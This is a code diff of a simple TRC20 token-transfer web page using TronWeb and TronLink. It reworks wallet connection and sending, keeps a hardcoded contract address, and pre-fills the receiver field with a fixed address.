@@ -1,71 +1,40 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>TRC20 DApp</title>
-</head>
-<body>
-
-<h2>TRC20 Token Transfer</h2>
-
-<button onclick="connect()">Connect Wallet</button>
-<p id="wallet">Not Connected</p>
-
-<hr>
-
-<label>Receiver Address:</label><br>
-<input id="to" size="50"><br><br>
-
-<label>Amount:</label><br>
-<input id="amount"><br><br>
-
-<button onclick="send()">Send Token</button>
-
-<p id="status"></p>
-
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
-
 <script>
 let tronWeb;
-
-// Contract Address
 const CONTRACT = "TRtajVqpr8g2YAhCUvYg7g2jksbxxacxoh";
 
-// Wait for TronLink injection
-function waitForTronWeb() {
-    return new Promise((resolve) => {
-        const check = () => {
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                return resolve(window.tronWeb);
-            }
-            setTimeout(check, 500);
-        };
-        check();
-    });
-}
-
-// Connect Wallet
-async function connect() {
+// Connect wallet with permission request
+async function connectWallet() {
     try {
-        tronWeb = await waitForTronWeb();
+        // request permission
+        if (window.tronLink) {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+        }
 
-        document.getElementById("wallet").innerText =
-            "Connected: " + tronWeb.defaultAddress.base58;
+        // check tronWeb
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            tronWeb = window.tronWeb;
+
+            document.getElementById("wallet").innerText =
+                "Connected: " + tronWeb.defaultAddress.base58;
+        } else {
+            alert("TronLink not detected. Please reload.");
+        }
 
     } catch (e) {
-        alert("TronLink not detected");
+        alert("User rejected connection or TronLink not working");
     }
 }
 
-// Send Token
-async function send() {
+// Send token
+async function sendToken() {
     try {
-        const to = document.getElementById("to").value;
-        const amount = document.getElementById("amount").value;
-
-        if (!to || !amount) {
-            alert("Enter address & amount");
+        if (!tronWeb) {
+            alert("Connect wallet first");
             return;
         }
+
+        const to = document.getElementById("to").value;
+        const amount = document.getElementById("amount").value;
 
         const contract = await tronWeb.contract().at(CONTRACT);
 
@@ -84,12 +53,9 @@ async function send() {
     }
 }
 
-// Auto fill receiver
-document.addEventListener("DOMContentLoaded", function() {
+// auto fill
+window.onload = function () {
     document.getElementById("to").value =
         "TNvLsEeNjM4ZVkZJLEZR8Sm3CKWfWWR5kn";
-});
+};
 </script>
-
-</body>
-</html>
